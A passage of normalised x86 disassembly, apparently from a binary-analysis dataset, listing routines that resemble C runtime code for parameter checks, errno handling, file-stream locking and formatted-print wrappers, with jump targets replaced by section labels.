pop esi
pop ebp
retn
sub_4176c9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417462
add esp 0xc
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
jmp r-xdata
xor esi esi
call sub_42fef5
mov esi [ eax ]
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_41772e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
push edi
or edi 0xffffffff
shr eax 0xd
test al 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
push esi
call sub_431863
pop ecx
mov eax edi
pop edi
push esi
call sub_43138b
push esi
mov edi eax
call sub_43157c
push esi
call sub_432468
push eax
call sub_432347
add esp 0x10
test eax eax
jns r-xdata
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_42d0aa
and [ esi + 0x1c ] 0x0
pop ecx
sub_4177a4
push 0x10
push r--data
call sub_40d260
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x20 ] esi
xor eax eax
test esi esi
setne al
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
shr eax 0xc
push esi
test al 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
and [ ebp - 0x1c ] 0x0
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_41772e
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41781a
mov eax esi
call sub_431863
pop ecx
jmp r-xdata
call sub_40d2a6
retn
or eax 0xffffffff
jmp r-xdata
sub_417824
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_417919
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417869
mov eax esi
call sub_40d2a6
retn 0xc
sub_417875
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417824
mov esp ebp
pop ebp
retn
sub_4178af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax ecx
pop ebp
retn 0x10
sub_4178e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
mov [ esi ] eax
call sub_43314b
mov [ esi + 0x4 ] al
mov eax esi
pop ecx
pop esi
pop ebp
retn 0x4
sub_417919
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_43314b
mov [ ebp - 0x4 ] al
mov eax [ esi ]
push [ eax ]
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax ]
mov eax [ esi + 0x4 ]
push [ eax ]
call sub_4179c5
push edi
push [ ebp - 0x4 ]
mov esi eax
call sub_433200
add esp 0x1c
mov eax esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_41799e
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add edx 0xc
mov eax [ edx ]
mov ecx eax
or ecx esi
[ edx ] ecx
jne r-xdata
and eax esi
neg eax
pop esi
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_4179c5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov ebx [ ebp + 0x14 ]
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
xor edx edx
div esi
cmp edi eax
ja r-xdata
lea eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
test eax 0x4c0
je r-xdata
mov edx 0x1000
mov edx [ ebx + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
test al 0xc0
je r-xdata
imul esi edi
mov [ ebp - 0x4 ] edx
mov edi esi
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi edx
jb r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
movsx eax [ ecx ]
push ebx
push eax
call sub_433129
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0xc ]
test al 0xc0
je r-xdata
js r-xdata
sub esi edi
xor edx edx
mov eax esi
div [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebx + 0x18 ]
inc ecx
dec edi
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] edx
test edx edx
jg r-xdata
mov eax edi
test edx edx
je r-xdata
push ebx
call sub_43138b
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push 0x10
pop ecx
[ eax ] ecx
cmp edi eax
jae r-xdata
test edi edi
jne r-xdata
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edi
xor edx edx
div [ ebp - 0x4 ]
mov eax edi
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
push eax
push ecx
push [ ebx ]
call sub_40d8e0
mov eax [ ebp - 0x8 ]
add esp 0xc
sub [ ebx + 0x8 ] eax
sub edi eax
mov ecx [ ebp + 0x8 ]
add [ ebx ] eax
add ecx eax
mov [ ebp + 0x8 ] ecx
jmp r-xdata
mov eax edi
mov [ ebp - 0x8 ] edi
push eax
push ecx
push ebx
call sub_432468
pop ecx
push eax
call sub_432a6c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jb r-xdata
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
add [ ebp + 0x8 ] edx
sub edi edx
cmp eax ecx
jb r-xdata
mov edx eax
mov ecx [ ebp + 0x8 ]
sub_417b3e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x14 ]
call sub_417875
pop ecx
pop ecx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov esp ebp
pop ebp
retn
sub_417b96
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417c01
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417bb9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417c01
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417c01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c7b0
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417c36
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417ca1
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417c59
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417ca1
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417ca1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c828
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417cd6
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417d41
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417cf9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417d41
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417d41
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c7ec
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417d76
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417de1
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417d99
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x18 ]
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417de1
mov eax [ esi + 0x10 ]
and [ esi + 0x458 ] 0x0
and [ esi + 0x45c ] 0x0
or [ esi + 0xaa4 ] 0xffffffff
or [ esi + 0xaa8 ] 0xffffffff
mov [ esi + 0x460 ] eax
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417de1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41c864
and [ esi + 0x450 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x14
sub_417e16
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41ce0e
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417e5b
mov eax esi
call sub_40d2a6
retn 0xc
sub_417e67
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41d0ad
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417eac
mov eax esi
call sub_40d2a6
retn 0xc
sub_417eb8
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41d1e4
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417efd
mov eax esi
call sub_40d2a6
retn 0xc
sub_417f09
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41cd48
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417f4e
mov eax esi
call sub_40d2a6
retn 0xc
sub_417f5a
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41cf18
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417f9f
mov eax esi
call sub_40d2a6
retn 0xc
sub_417fab
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4173ac
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41cfe7
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417ff0
mov eax esi
call sub_40d2a6
retn 0xc
sub_417ffc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417f09
mov esp ebp
pop ebp
retn
sub_418024
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417e16
mov esp ebp
pop ebp
retn
sub_41804c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417f5a
mov esp ebp
pop ebp
retn
sub_418074
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417fab
mov esp ebp
pop ebp
retn
sub_41809c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417e67
mov esp ebp
pop ebp
retn
sub_4180c4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417eb8
mov esp ebp
pop ebp
retn
sub_4180ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_4180c4
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_418145
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_417ffc
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41819e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_418024
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4181f7
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_41809c
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_418250
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_418074
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4182a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_41804c
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_418302
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x18 ]
test edi edi
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov esp ebp
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
cmp [ ebp + 0x14 ] esi
jne r-xdata
call sub_42fef5
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
cmp ebx edi
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ eax ]
push ebx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_41850e
add esp 0x1c
mov [ esi + ebx - 0x1 ] 0x0
cmp eax 0xfffffffe
jne r-xdata
mov ebx [ eax ]
lea eax [ edi + 0x1 ]
push eax
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41850e
add esp 0x1c
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
pop ebx
test eax eax
jns r-xdata
cmp edi 0xffffffff
jne r-xdata
call sub_42fef5
cmp [ eax ] 0x22
jne r-xdata
mov [ esi ] 0x0
cmp eax 0xfffffffe
jne r-xdata
call sub_42fef5
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_42fef5
mov [ eax ] ebx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x22
jmp r-xdata
call sub_42fef5
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
jmp r-xdata
call sub_42fdcf
sub_418406
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x18 ]
test edi edi
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov esp ebp
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x16
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
cmp [ ebp + 0x14 ] esi
jne r-xdata
call sub_42fef5
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
cmp ebx edi
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ eax ]
push ebx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_41868a
xor ecx ecx
add esp 0x1c
mov [ esi + ebx * 2 - 0x2 ] cx
cmp eax 0xfffffffe
jne r-xdata
mov ebx [ eax ]
lea eax [ edi + 0x1 ]
push eax
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41868a
add esp 0x1c
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
pop ebx
test eax eax
jns r-xdata
cmp edi 0xffffffff
jne r-xdata
call sub_42fef5
cmp [ eax ] 0x22
jne r-xdata
xor ecx ecx
mov [ esi ] cx
cmp eax 0xfffffffe
jne r-xdata
call sub_42fef5
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_42fef5
mov [ eax ] ebx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x22
jmp r-xdata
call sub_42fef5
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
jmp r-xdata
call sub_42fdcf
sub_41850e
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cb44
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cd01
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x1
or eax ecx
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41c939
lea ecx [ ebp - 0x45c ]
call sub_41e71a
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax ecx
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
mov [ edi + eax ] cl
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
mov [ edi ] cl
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov [ edi + ebx - 0x1 ] cl
jmp r-xdata
jmp r-xdata
sub_41868a
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cb44
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
